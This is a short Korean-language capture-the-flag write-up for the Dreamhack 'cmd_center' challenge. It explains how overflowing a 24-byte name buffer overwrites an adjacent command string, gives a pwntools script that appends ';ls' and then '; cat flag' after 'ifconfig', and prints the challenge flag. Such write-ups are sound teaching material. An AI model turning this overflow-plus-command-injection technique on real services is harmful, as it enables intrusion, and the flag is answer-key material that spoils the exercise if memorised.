@@ -1,0 +1,42 @@
+같이 들어있는 c 코드를 보면
+center_name[24]에 입력을 받고 있다.
+
+center_name에 A 24개 + p64(100) 을 입력하니까
+Something is wrong!이라는 말이 나왔다.
+이 뜻은 cmd_ip의 값이 ifconfig에서 무언가로 바뀌었단 뜻이다.
+
+왜 바뀌었을까? 두 값의 위치를 보자
+IDA로 보면 strncmp함수와 read함수 부분에서 불러오는 값의 위치를 볼 수 있다.
+
+read할 땐 rbp+buf = rbp-0x130
+strncmp할 땐 rbp+s1 = rbp-0x110
+
+read할 땐 center_name이고 strncmp할 땐 cmd_ip이므로
+center_name시작에서 0x20만큼 떨어진 곳은 cmd_ip가 시작되는 곳일 것이다.
+
+코드를 짜보자
+
+---------------------------
+
+from pwn import *
+
+p=remote('host3.dreamhack.games',10575)
+
+d=b'A'*0x20
+d+=b'ifconfig ;ls' #일단 ls 해보자 (어차피 8글자만 확인해서 가능)
+
+p.recv()
+p.sendline(d)
+
+p.interactive()
+
+-----------------------------
+
+cmd_center
+flag
+run.sh
+이렇게 3개가 보인다
+
+여기서 flag를 보려면 ifconfig ; cat flag를 하면 된다.
+
+DH{f4c11bf9ea5a1df24175ee4d11da0d16} 이 나온다.
